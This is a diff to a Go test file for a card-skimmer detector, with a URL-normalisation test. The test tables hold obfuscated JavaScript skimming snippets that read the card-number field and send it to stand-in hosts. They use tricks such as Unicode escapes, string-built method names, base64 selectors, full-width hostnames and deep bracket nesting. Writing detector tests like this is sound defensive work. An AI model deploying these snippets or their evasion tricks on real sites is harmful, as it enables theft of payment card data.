@@ -313,15 +313,19 @@ func TestSkimmerAcrossWhiteSpaceAndModules(t *testing.T) {
 func TestSkimmerSignalsOnTokens(t *testing.T) {
 	fields := `var f=document.querySelector('[name="payment[cc_number]"]');`
 	for name, src := range map[string]string{
-		"new through brackets": fields + `new(Image)().src="https://img.example.com/p?d="+f.value`,
-		"new and a comment":    fields + `new/**/Image().src="https://img.example.com/p?d="+f.value`,
-		"escaped name":         fields + `new Imag\u0065().src="https://img.example.com/p?d="+f.value`,
-		"spaced member":        fields + `navigator. sendBeacon("https://img.example.com/p",f.value)`,
-		"member by string":     fields + `navigator['send'+'Beacon']("https://img.example.com/p",f.value)`,
-		"joined host":          fields + `fetch("https://"+"img.example.com/p",{method:"POST",body:f.value})`,
-		"built decoder name":   `var f=document.querySelector('[name="'+globalThis['at'+'ob']('cGF5bWVudFtjY19udW1iZXJd')+'"]');new Image().src="https://img.example.com/p?d="+f.value`,
-		"folded letter":        `var n='ſecurity_code'.toUpperCase().toLowerCase();new Image().src="https://img.example.com/p?d="+n`,
-		"escaped atob":         `var n=\u0061tob("W25hbWU9InBheW1lbnRbY2NfbnVtYmVyXSJd");var f=document.querySelector(n);`,
+		"new through brackets":     fields + `new(Image)().src="https://img.example.com/p?d="+f.value`,
+		"new and a comment":        fields + `new/**/Image().src="https://img.example.com/p?d="+f.value`,
+		"escaped name":             fields + `new Imag\u0065().src="https://img.example.com/p?d="+f.value`,
+		"spaced member":            fields + `navigator. sendBeacon("https://img.example.com/p",f.value)`,
+		"member by string":         fields + `navigator['send'+'Beacon']("https://img.example.com/p",f.value)`,
+		"joined host":              fields + `fetch("https://"+"img.example.com/p",{method:"POST",body:f.value})`,
+		"escaped tab before a URL": fields + `fetch('\thttps://img.example.com/p?d='+f.value)`,
+		"backslashes in a URL":     fields + `fetch('https:\\\\img.example.com/p?d='+f.value)`,
+		"full-width host":          fields + "fetch('https://\uff49\uff4d\uff47.example.com/p?d='+f.value)",
+		"thousands of brackets":    fields + "new" + strings.Repeat("(", 2100) + "Image" + strings.Repeat(")", 2100) + `().src="https://img.example.com/p?d="+f.value`,
+		"built decoder name":       `var f=document.querySelector('[name="'+globalThis['at'+'ob']('cGF5bWVudFtjY19udW1iZXJd')+'"]');new Image().src="https://img.example.com/p?d="+f.value`,
+		"folded letter":            `var n='ſecurity_code'.toUpperCase().toLowerCase();new Image().src="https://img.example.com/p?d="+n`,
+		"escaped atob":             `var n=\u0061tob("W25hbWU9InBheW1lbnRbY2NfbnVtYmVyXSJd");var f=document.querySelector(n);`,
 	} {
 		if skimmerSignals([]byte(src)) == nil {
 			t.Errorf("%s: not found", name)
@@ -379,6 +383,33 @@ func TestAnchoredSearchesMatchThePatterns(t *testing.T) {
 	for _, s := range []string{long, long[:len(long)-4] + "'", "'" + strings.Repeat("QUJD", 99) + "'", `x"` + strings.Repeat("a/+9", 101) + `"y`} {
 		if got, want := longBase64([]byte(s)), obfuscation.MatchString(s); got != want {
 			t.Errorf("longBase64 on a %d-byte literal: %v, the pattern says %v", len(s), got, want)
+		}
+	}
+}
+
+// A string that a browser reads as a URL to another host reads so here too, whatever spacing,
+// backslashes or Unicode host it is written with.
+func TestWHATWGURLs(t *testing.T) {
+	for in, want := range map[string]string{
+		" https://evil.example/p":     "https://evil.example/p",
+		"\thttps://evil.example/p":    "https://evil.example/p",
+		"\nhttps://evil.example/p":    "https://evil.example/p",
+		`https:\\evil.example/p`:      "https://evil.example/p",
+		`\\evil.example/p`:            "//evil.example/p",
+		`https:/\evil.example/p`:      "https://evil.example/p",
+		"https://ev\til.example/p":    "https://evil.example/p",
+		"https://evil。example/p":      "https://evil.example/p",
+		"https://ｅｖｉｌ.example/p":      "https://evil.example/p",
+		"HTTPS://Evil.Example/P":      "https://evil.example/P",
+		"https://user@evil.example/p": "https://evil.example/p",
+	} {
+		if got, ok := whatwgURL(in); !ok || got != want {
+			t.Errorf("%q: %q, %v", in, got, ok)
+		}
+	}
+	for _, in := range []string{"payment[cc_number]", "/relative/path", "mailto:x@example.com", "javascript:void(0)"} {
+		if got, ok := whatwgURL(in); ok {
+			t.Errorf("%q read as the URL %q", in, got)
 		}
 	}
 }
